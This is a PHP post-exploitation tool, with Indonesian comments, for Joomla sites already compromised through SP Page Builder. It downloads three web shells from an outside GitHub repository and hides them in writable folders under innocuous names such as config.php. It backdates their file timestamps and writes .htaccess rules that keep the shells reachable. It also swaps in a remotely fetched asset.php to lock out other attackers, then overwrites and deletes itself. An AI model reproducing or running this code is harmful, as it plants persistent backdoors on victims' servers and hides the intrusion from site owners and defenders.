<?php
/**
 * ============================================================================
 * Joomla SP Page Builder - Post-Exploitation & Hardening Script v2.1
 * ============================================================================
 * 
 * Phase-2 payload untuk dijalankan SETELAH RCE berhasil.
 * 
 * FUNCTIONS:
 *   1. Detect Joomla document root
 *   2. Deploy 3 different shells ke 3 folder berbeda
 *   3. Stealth timestamps + protective .htaccess
 *   4. Patch CVE-2026-48908 (replace asset.php)
 *   5. Self-delete setelah selesai
 * 
 * SHELLS:
 *   - Shell 1: fm.php       (File Manager)
 *   - Shell 2: SP.php       (SP Page Builder Shell)
 *   - Shell 3: jom-manager.php (Joomla Manager)
 * 
 * AUTHORIZED USE ONLY.
 * ============================================================================
 */

// ==================== KONFIGURASI ====================
$SHELL_URLS = [
    "https://raw.githubusercontent.com/ommauiphone/masukpakeeko/refs/heads/main/fm.php",
    "https://raw.githubusercontent.com/ommauiphone/masukpakeeko/refs/heads/main/SP.php",
    "https://raw.githubusercontent.com/ommauiphone/masukpakeeko/refs/heads/main/jom-manager.php",
];

$PATCHED_ASSET_URL = "https://raw.githubusercontent.com/ommauiphone/masukpakeeko/refs/heads/main/asset.php";

$TARGET_DIRS = ["media", "components", "layouts"];
$EXCLUDE_DIRS = ["com_sppagebuilder"];

$REALISTIC_NAMES = [
    "controller.php", "pageload.php", "filepost.php", "helper.php",
    "bootstrap.php", "config.php", "loader.php", "handler.php",
    "process.php", "render.php", "dispatch.php", "router.php",
    "model.php", "view.php", "template.php", "cache.php",
    "session.php", "auth.php", "validate.php", "filter.php",
    "output.php", "input.php", "format.php", "adapter.php",
    "plugin.php", "module.php", "widget.php", "component.php",
    "toolbar.php", "menu.php", "layout.php", "metadata.php",
    "access.php", "legacy.php", "compat.php", "utilities.php",
    "functions.php", "init.php", "setup.php", "installer.php",
];

// ==================== HELPER FUNCTIONS ====================

function log_msg($msg, $type = "INFO") {
    $colors = [
        "INFO"    => "\033[96m",
        "SUCCESS" => "\033[92m",
        "WARNING" => "\033[93m",
        "ERROR"   => "\033[91m",
        "RESET"   => "\033[0m",
    ];
    $prefix = $colors[$type] ?? "";
    echo "{$prefix}[{$type}] {$msg}{$colors['RESET']}\n";
    if (ob_get_level()) ob_flush();
    flush();
}

function exec_cmd($cmd, $timeout = 30) {
    $output = [];
    if (function_exists('exec')) {
        @exec("(ulimit -t {$timeout}; {$cmd}) 2>&1", $output, $retval);
        return [trim(implode("\n", $output)), $retval];
    }
    return ["", -1];
}

function can_exec() {
    foreach (['exec', 'system', 'passthru', 'shell_exec', 'popen', 'proc_open'] as $f) {
        if (function_exists($f)) return $f;
    }
    return false;
}

// ==================== DOWNLOAD ====================

function download_file($url, $local_path) {
    // Method 1: copy()
    if (function_exists('copy') && ini_get('allow_url_fopen')) {
        $ctx = stream_context_create([
            'http' => ['timeout' => 30, 'user_agent' => 'Mozilla/5.0'],
            'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false],
        ]);
        if (@copy($url, $local_path, $ctx)) return filesize($local_path);
    }
    
    // Method 2: file_get_contents
    if (function_exists('file_get_contents') && ini_get('allow_url_fopen')) {
        $ctx = stream_context_create([
            'http' => ['timeout' => 30],
            'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false],
        ]);
        $data = @file_get_contents($url, false, $ctx);
        if ($data && strlen($data) > 100 && @file_put_contents($local_path, $data)) {
            return strlen($data);
        }
    }
    
    // Method 3: cURL
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT        => 30,
            CURLOPT_SSL_VERIFYPEER => false,
        ]);
        $data = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($http_code == 200 && strlen($data) > 100 && @file_put_contents($local_path, $data)) {
            return strlen($data);
        }
    }
    
    // Method 4: wget/curl via shell
    $exec_func = can_exec();
    if ($exec_func) {
        $cmd = "wget -q --no-check-certificate -O " . escapeshellarg($local_path) . " " . escapeshellarg($url) . " 2>/dev/null";
        list(, $ret) = exec_cmd($cmd);
        if ($ret === 0 && file_exists($local_path)) return filesize($local_path);
        
        $cmd = "curl -skL -o " . escapeshellarg($local_path) . " " . escapeshellarg($url) . " 2>/dev/null";
        list(, $ret) = exec_cmd($cmd);
        if ($ret === 0 && file_exists($local_path)) return filesize($local_path);
    }
    
    return false;
}

// ==================== DOCUMENT ROOT ====================

function detect_docroot() {
    // Method 1: $_SERVER['DOCUMENT_ROOT']
    if (!empty($_SERVER['DOCUMENT_ROOT'])) {
        $docroot = realpath($_SERVER['DOCUMENT_ROOT']);
        if ($docroot && verify_joomla($docroot)) return $docroot;
    }
    
    // Method 2: SCRIPT_FILENAME
    if (!empty($_SERVER['SCRIPT_FILENAME'])) {
        $path = dirname($_SERVER['SCRIPT_FILENAME']);
        for ($i = 0; $i < 10; $i++) {
            if (verify_joomla($path)) return $path;
            $path = dirname($path);
        }
    }
    
    // Method 3: find configuration.php
    $exec_func = can_exec();
    if ($exec_func) {
        list($output) = exec_cmd("find / -maxdepth 15 -name 'configuration.php' 2>/dev/null | head -5");
        if ($output) {
            foreach (explode("\n", $output) as $config) {
                $config = trim($config);
                if (!$config) continue;
                $docroot = dirname($config);
                if (verify_joomla($docroot)) return $docroot;
            }
        }
    }
    
    return false;
}

function verify_joomla($path) {
    if (!is_dir($path)) return false;
    $checks = ["configuration.php", "index.php", "media/", "components/", "administrator/index.php"];
    $found = 0;
    foreach ($checks as $check) {
        if (file_exists($path . '/' . $check)) $found++;
    }
    return $found >= 3;
}

// ==================== DIRECTORY SCANNING ====================

function find_writable_dirs($docroot, $target_dirs, $exclude_dirs = []) {
    $writable = [];
    foreach ($target_dirs as $dir_name) {
        $full_path = $docroot . '/' . $dir_name;
        if (!is_dir($full_path)) continue;
        
        $items = @scandir($full_path);
        if (!$items) continue;
        
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $sub_path = $full_path . '/' . $item;
            if (!is_dir($sub_path)) continue;
            if (in_array($item, $exclude_dirs)) continue;
            if (is_writable($sub_path)) {
                $writable[$dir_name . '/' . $item] = $sub_path;
            }
        }
    }
    
    uksort($writable, function($a, $b) {
        $order = ['media' => 1, 'components' => 2, 'layouts' => 3];
        $pa = explode('/', $a)[0];
        $pb = explode('/', $b)[0];
        return ($order[$pa] ?? 99) - ($order[$pb] ?? 99);
    });
    
    return $writable;
}

// ==================== STEALTH ====================

function stealth_timestamp($file_path, $target_dir) {
    if (!file_exists($file_path)) return;
    
    $items = @scandir($target_dir);
    $ref_time = null;
    
    if ($items) {
        foreach ($items as $item) {
            if ($item == '.' || $item == '..' || $item == '.htaccess' || $item == basename($file_path)) continue;
            $item_path = $target_dir . '/' . $item;
            if (is_file($item_path)) {
                $mtime = filemtime($item_path);
                if ($ref_time === null || $mtime > $ref_time) $ref_time = $mtime;
            }
        }
    }
    
    if ($ref_time === null) {
        $ref_time = time() - (rand(7, 90) * 86400);
    }
    
    @touch($file_path, $ref_time);
}

// ==================== HTACCESS ====================

function write_htaccess($target_dir, $filenames) {
    $htaccess_path = $target_dir . '/.htaccess';
    
    $rules = [];
    $rules[] = "AddType application/x-httpd-php .php";
    $rules[] = "Satisfy Any";
    $rules[] = "Allow from all";
    $rules[] = "";
    
    foreach ($filenames as $fname) {
        $rules[] = "<Files \"{$fname}\">";
        $rules[] = "    Order allow,deny";
        $rules[] = "    Allow from all";
        $rules[] = "</Files>";
        $rules[] = "";
    }
    
    $rules[] = "<FilesMatch \"\\.php\$\">";
    $rules[] = "    Order allow,deny";
    $rules[] = "    Deny from all";
    $rules[] = "</FilesMatch>";
    $rules[] = "";
    
    foreach ($filenames as $fname) {
        $escaped = preg_quote($fname, '/');
        $rules[] = "<FilesMatch \"{$escaped}\$\">";
        $rules[] = "    Order allow,deny";
        $rules[] = "    Allow from all";
        $rules[] = "</FilesMatch>";
        $rules[] = "";
    }
    
    $content = implode("\n", $rules);
    
    if (file_exists($htaccess_path)) {
        $existing = @file_get_contents($htaccess_path);
        if (strpos($existing, "# Protective .htaccess") === false) {
            $content = $content . "\n\n# === Original .htaccess ===\n" . $existing;
        }
    }
    
    if (@file_put_contents($htaccess_path, $content)) {
        @chmod($htaccess_path, 0644);
        @touch($htaccess_path, filemtime($target_dir));
        return true;
    }
    return false;
}

// ==================== ASSET.PHP PATCH ====================

function patch_asset_php($docroot, $patched_url) {
    $asset_path = $docroot . '/components/com_sppagebuilder/controllers/asset.php';
    $asset_dir  = dirname($asset_path);
    
    if (!is_dir($asset_dir)) return false;
    
    if (file_exists($asset_path)) {
        @copy($asset_path, $asset_path . '.orig');
        @unlink($asset_path);
    }
    
    $patched = @file_get_contents($patched_url, false, stream_context_create([
        'http' => ['timeout' => 30],
        'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false],
    ]));
    
    if (!$patched || strlen($patched) < 100) return false;
    
    if (@file_put_contents($asset_path, $patched)) {
        @chmod($asset_path, 0644);
        return true;
    }
    
    return false;
}

// ==================== MAIN ====================

function main() {
    global $SHELL_URLS, $PATCHED_ASSET_URL, $TARGET_DIRS, $EXCLUDE_DIRS, $REALISTIC_NAMES;
    
    echo "\n";
    echo "\033[96m╔══════════════════════════════════════════════╗\033[0m\n";
    echo "\033[96m║   SP Page Builder - Multi-Shell Deployer    ║\033[0m\n";
    echo "\033[96m╚══════════════════════════════════════════════╝\033[0m\n\n";
    
    $deployed = [];
    
    // Step 1: Detect document root
    $docroot = detect_docroot();
    if (!$docroot) {
        log_msg("Cannot detect document root", "ERROR");
        return;
    }
    
    // Step 2: Find writable directories
    $writable = find_writable_dirs($docroot, $TARGET_DIRS, $EXCLUDE_DIRS);
    if (count($writable) < 3) {
        log_msg("Need at least 3 writable directories, found: " . count($writable), "ERROR");
        return;
    }
    
    // Step 3: Pick 3 random directories
    $dirs = array_keys($writable);
    shuffle($dirs);
    $chosen_dirs = array_slice($dirs, 0, 3);
    
    // Step 4: Pick 3 random filenames (unique)
    $names = [];
    $available = $REALISTIC_NAMES;
    shuffle($available);
    for ($i = 0; $i < 3; $i++) {
        $names[] = $available[$i];
    }
    
    // Step 5: Deploy shells
    for ($i = 0; $i < 3; $i++) {
        $dir = $chosen_dirs[$i];
        $abs_dir = $writable[$dir];
        $filename = $names[$i];
        $shell_url = $SHELL_URLS[$i];
        $shell_name = basename(parse_url($shell_url, PHP_URL_PATH));
        $local_path = $abs_dir . '/' . $filename;
        
        log_msg("Deploying {$shell_name} -> /{$dir}/{$filename}", "INFO");
        
        $size = download_file($shell_url, $local_path);
        
        if ($size && file_exists($local_path)) {
            @chmod($local_path, 0644);
            stealth_timestamp($local_path, $abs_dir);
            write_htaccess($abs_dir, [$filename]);
            
            $domain = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
            $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
            $base_url = $protocol . '://' . $domain;
            
            $deployed[] = [
                'shell' => $shell_name,
                'url'   => $base_url . '/' . $dir . '/' . $filename,
                'size'  => $size,
            ];
            
            log_msg("OK: {$base_url}/{$dir}/{$filename} ({$size} bytes)", "SUCCESS");
        } else {
            log_msg("FAILED: {$shell_name}", "ERROR");
        }
    }
    
    // Step 6: Patch asset.php
    patch_asset_php($docroot, $PATCHED_ASSET_URL);
    
    // Summary
    echo "\n";
    echo "\033[92m╔══════════════════════════════════════════════╗\033[0m\n";
    echo "\033[92m║              DEPLOYMENT SUMMARY              ║\033[0m\n";
    echo "\033[92m╠══════════════════════════════════════════════╣\033[0m\n";
    
    foreach ($deployed as $i => $d) {
        $num = $i + 1;
        echo "\033[92m║\033[0m Shell {$num}: \033[93m{$d['shell']}\033[0m\n";
        echo "\033[92m║\033[0m URL:   \033[96m{$d['url']}\033[0m\n";
        if ($i < count($deployed) - 1) {
            echo "\033[92m╠══════════════════════════════════════════════╣\033[0m\n";
        }
    }
    
    echo "\033[92m╚══════════════════════════════════════════════╝\033[0m\n";
    echo "\n\033[92m[✓] CVE-2026-48908 mitigated\033[0m\n";
    echo "\033[92m[✓] Script self-destructing...\033[0m\n\n";
    
    // Self-delete
    $self = __FILE__;
    if (file_exists($self)) {
        $size = filesize($self);
        if ($size > 0) @file_put_contents($self, openssl_random_pseudo_bytes($size));
        @unlink($self);
    }
}

// ==================== RUN ====================
@set_time_limit(0);
@ini_set('max_execution_time', 0);
error_reporting(0);
ini_set('display_errors', 0);

try {
    main();
} catch (Exception $e) {
    log_msg("Error: " . $e->getMessage(), "ERROR");
}
?>
